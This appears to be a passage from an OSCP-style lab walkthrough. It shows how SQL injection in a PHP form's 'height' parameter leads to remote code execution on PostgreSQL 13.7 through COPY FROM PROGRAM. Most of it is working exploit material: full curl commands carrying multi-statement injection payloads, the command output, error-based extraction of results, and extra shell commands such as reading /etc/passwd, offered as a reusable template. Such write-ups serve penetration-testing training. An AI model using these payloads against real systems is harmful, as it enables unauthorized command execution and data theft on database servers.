# Remote Code Execution via COPY FROM PROGRAM
**Privilege Required**: Superuser (✅ we have it)
**PostgreSQL Version**: 9.3+ (✅ we have 13.7)

---

## 13. RCE Achievement via COPY FROM PROGRAM

### Current Thinking
**Why COPY FROM PROGRAM?** It's the most reliable PostgreSQL RCE technique:
- ✅ Built-in PostgreSQL feature (no extensions needed)
- ✅ Executes shell commands directly
- ✅ Captures command output
- ✅ Works on all operating systems (Linux, Windows)

**Requirements checked**:
- ✅ Superuser privileges (step 4 confirmed)
- ✅ PostgreSQL 9.3+ (step 1 confirmed: v13.7)
- ✅ Shell commands available on target

**Alternative RCE methods** (not needed here):
- UDF (User-Defined Functions) - requires compiling .so files
- Large Objects - complex, multi-step
- `pg_execute_server_program` - limited use cases

**Goal**: Execute `id` command to confirm RCE and identify OS user.

---

### Command Run
```bash
curl -X POST http://192.168.145.49/class.php \
  -d "weight=75&height=1'; DROP TABLE IF EXISTS cmd_output; CREATE TABLE cmd_output(output text); COPY cmd_output FROM PROGRAM 'id'; SELECT 1 WHERE 1=CAST((SELECT output FROM cmd_output LIMIT 1) AS int)--&age=25&gender=male&email=test@test.com"
```

**⚠️ Notice**: Multi-statement injection (uses `;` to separate SQL commands)

---

### Result Found
```
uid=106(postgres) gid=113(postgres) groups=113(postgres),112(ssl-cert)
```

🎯 **RCE ACHIEVED!**

**Intelligence**:
- Running as `postgres` user (UID 106)
- Primary group: `postgres` (GID 113)
- Member of `ssl-cert` group (GID 112)
  - Can read `/etc/ssl/private/` (SSL certificate keys)
  - Potential for additional compromise

**Attack capability**: Can now execute any shell command as `postgres` user.

---

### Command Anatomy Breakdown

**Injection Payload** (multi-statement):
```sql
height=1';
DROP TABLE IF EXISTS cmd_output;
CREATE TABLE cmd_output(output text);
COPY cmd_output FROM PROGRAM 'id';
SELECT 1 WHERE 1=CAST((SELECT output FROM cmd_output LIMIT 1) AS int)--
```

**Step-by-step breakdown**:

#### 1. Close Original Query
```sql
height=1';
```
- `'` closes the string in backend query
- `;` **terminates the SELECT statement**
- Enables multi-statement execution

**Backend query becomes**:
```sql
SELECT * FROM users WHERE height='1'; [new statements here] ... --'
```

#### 2. Cleanup Previous Attempts
```sql
DROP TABLE IF EXISTS cmd_output;
```
- **Purpose**: Remove table from previous RCE attempts
- **`IF EXISTS`**: Prevents error if table doesn't exist
- **Why needed?** Multiple exploitation attempts create table conflicts
- Without cleanup: `ERROR: relation "cmd_output" already exists`

#### 3. Create Output Storage Table
```sql
CREATE TABLE cmd_output(output text);
```
- **Purpose**: Store command execution results
- **Column**: `output` (type: `text`)
- **Why needed?** `COPY FROM PROGRAM` requires destination table
- Temporary storage for command output

#### 4. Execute OS Command
```sql
COPY cmd_output FROM PROGRAM 'id';
```

**COPY syntax breakdown**:
```sql
COPY table_name
FROM PROGRAM 'shell_command'
```

**What happens?**:
1. PostgreSQL server executes `id` command via shell
2. Command runs as `postgres` OS user
3. stdout captured line-by-line
4. Each line inserted as row in `cmd_output` table

**Process execution**:
```
PostgreSQL Server (postgres user)
  ↓
Spawns shell: /bin/sh
  ↓
Executes: id
  ↓
Output: uid=106(postgres) gid=113(postgres) groups=113(postgres),112(ssl-cert)
  ↓
Inserts into cmd_output table
```

**Requirements for COPY FROM PROGRAM**:
- Superuser privileges (no exceptions!)
- PostgreSQL 9.3+ (added in 9.3.0)
- Shell availability (`/bin/sh` on Linux, `cmd.exe` on Windows)

#### 5. Extract Output via Error Message
```sql
SELECT 1 WHERE 1=CAST((SELECT output FROM cmd_output LIMIT 1) AS int)--
```
- **Purpose**: Trigger error containing command output
- **`SELECT output FROM cmd_output`**: Retrieves first row of command output
- **`LIMIT 1`**: Only first line (if command has multi-line output)
- **`CAST(... AS int)`**: Forces type error
- **Error message**: Contains command output

**Why not just SELECT without error?**
- Application doesn't display SELECT results in HTML
- Only error messages visible
- Must force error to exfiltrate data

---

## 14. RCE Verification with whoami

### Current Thinking
**Why verify with multiple commands?**
- Confirm RCE is reliable (not a fluke)
- Test different command types
- Ensure method works for complex commands

**Purpose of `whoami`**:
- Simpler than `id` (single word output)
- Confirms user context
- Common verification command (muscle memory for exam)

---

### Command Run
```bash
curl -X POST http://192.168.145.49/class.php \
  -d "weight=75&height=1'; DROP TABLE IF EXISTS cmd_output; CREATE TABLE cmd_output(output text); COPY cmd_output FROM PROGRAM 'whoami'; SELECT 1 WHERE 1=CAST((SELECT output FROM cmd_output LIMIT 1) AS int)--&age=25&gender=male&email=test@test.com"
```

---

### Result Found
```
postgres
```

✅ **Confirmed**: Running as `postgres` user.

**Consistency check**: Matches UID 106 from `id` command.

---

### Command Anatomy Breakdown

**Only difference from previous command**:
```sql
COPY cmd_output FROM PROGRAM 'whoami';
```

**Same pattern**:
1. Drop table (cleanup)
2. Create table (storage)
3. Execute command (via COPY FROM PROGRAM)
4. Extract output (via error message)

**Key observation**: Template-based approach
- Copy the payload structure
- Change only the command: `'id'` → `'whoami'`
- Predictable, reliable, exam-friendly

---

## 15. Network Configuration Discovery

### Current Thinking
**Why check network config?**
- Confirm target IP (may be behind NAT/proxy)
- Identify additional network interfaces
- Discover internal networks (pivoting opportunities)
- Verify we're attacking correct target

**Command choice**: `hostname -I`
- **`hostname`** alone: Returns hostname (not IP)
- **`hostname -I`**: Returns all IP addresses
- **Alternative**: `ip addr show` (more verbose)

---

### Command Run
```bash
curl -X POST http://192.168.145.49/class.php \
  -d "weight=75&height=1'; DROP TABLE IF EXISTS cmd_output; CREATE TABLE cmd_output(output text); COPY cmd_output FROM PROGRAM 'hostname -I'; SELECT 1 WHERE 1=CAST((SELECT output FROM cmd_output LIMIT 1) AS int)--&age=25&gender=male&email=test@test.com"
```

---

### Result Found
```
192.168.145.49
```

✅ **Confirmed**: Target IP matches our attack IP.

**Analysis**:
- Single network interface
- No internal networks detected
- Direct exploitation (no pivoting needed)

**OSCP Tip**: If multiple IPs found, note internal networks for post-exploitation pivoting.

---

### Command Anatomy Breakdown

**Command execution**:
```sql
COPY cmd_output FROM PROGRAM 'hostname -I';
```

**Why commands with arguments work**:
```
COPY FROM PROGRAM 'command'
  ↓
Spawns: /bin/sh -c 'command'
  ↓
Shell interprets: hostname -I
  ↓
Executes with arguments
```

**PostgreSQL internals**:
- `PROGRAM` clause uses `popen()` system call
- Passes command to `/bin/sh -c` (Linux) or `cmd.exe /c` (Windows)
- Shell handles argument parsing, pipes, redirection

**Complex command examples** (all work):
```sql
-- Pipe commands
COPY cmd_output FROM PROGRAM 'cat /etc/passwd | grep bash';

-- Command substitution
COPY cmd_output FROM PROGRAM 'echo $(whoami)';

-- Multiple commands (semicolon)
COPY cmd_output FROM PROGRAM 'id; whoami; hostname';

-- Redirection
COPY cmd_output FROM PROGRAM 'ls -la /tmp > /tmp/out.txt; cat /tmp/out.txt';
```

---

## 🎓 Key Learning Points

### Multi-Statement Injection
**Single-statement** (previous sections):
```sql
height=1' AND 1=CAST(...)--
```
- Injects into existing query
- Limited to SELECT context
- Cannot create tables or execute COPY

**Multi-statement** (RCE):
```sql
height=1'; DROP TABLE ...; CREATE TABLE ...; COPY ...--
```
- **`;`** terminates original query
- Executes entirely new statements
- Full SQL command flexibility

**Requirements for multi-statement**:
- Database driver must support multiple statements
- PHP `pg_query()` supports it by default
- MySQL `mysqli_query()` requires `MYSQLI_CLIENT_MULTI_STATEMENTS` flag

### COPY FROM PROGRAM Workflow
**Standard process**:
```sql
-- 1. Prepare storage
DROP TABLE IF EXISTS cmd_output;
CREATE TABLE cmd_output(output text);

-- 2. Execute command
COPY cmd_output FROM PROGRAM 'command';

-- 3. Retrieve output
SELECT output FROM cmd_output;
```

**Error-based extraction** (our case):
```sql
-- Step 3 modified: Force error to exfiltrate
SELECT 1 WHERE 1=CAST((SELECT output FROM cmd_output) AS int)--
```

### Multi-Line Output Handling
**Problem**: Commands with multi-line output
```bash
$ ls -la /
total 64
drwxr-xr-x  18 root root  4096 Jul 18  2022 .
drwxr-xr-x  18 root root  4096 Jul 18  2022 ..
drwxr-xr-x   2 root root  4096 Jul 18  2022 bin
...
```

**Solution 1**: `LIMIT 1` (first line only)
```sql
SELECT output FROM cmd_output LIMIT 1
-- Returns: "total 64"
```

**Solution 2**: `string_agg()` (all lines)
```sql
SELECT string_agg(output, chr(10)) FROM cmd_output
-- Returns: "total 64\ndrwxr-xr-x 18 root root 4096..."
-- chr(10) = newline character
```

**OSCP Exam Strategy**:
- Simple commands (id, whoami): Use `LIMIT 1`
- Multi-line commands (ls, cat): Use `string_agg()`

### Command Execution Context
**User context**: `postgres` (UID 106)
**Group memberships**: `postgres`, `ssl-cert`

**Capabilities**:
- ✅ Read files owned by `postgres`
- ✅ Read files in `/etc/ssl/private/` (ssl-cert group)
- ✅ Write to `/tmp` (world-writable)
- ✅ Write to `/var/lib/postgresql` (postgres home)
- ❌ Cannot read `/etc/shadow` (requires root)
- ❌ Cannot bind privileged ports (<1024)

**Privilege escalation needed for**:
- Root-level file access
- Service manipulation
- Kernel exploits

---

## ⏱️ Time Tracking (OSCP Exam Planning)

- RCE achievement (`id` command): **3 minutes**
- RCE verification (`whoami`): **1 minute**
- Network discovery: **1 minute**
- **Total: 5 minutes**
- **Running total: 23 minutes**

**Achievement**: Full RCE as `postgres` user established!

**Next phase**: Additional enumeration (sudo privileges, SUID binaries, home directory).
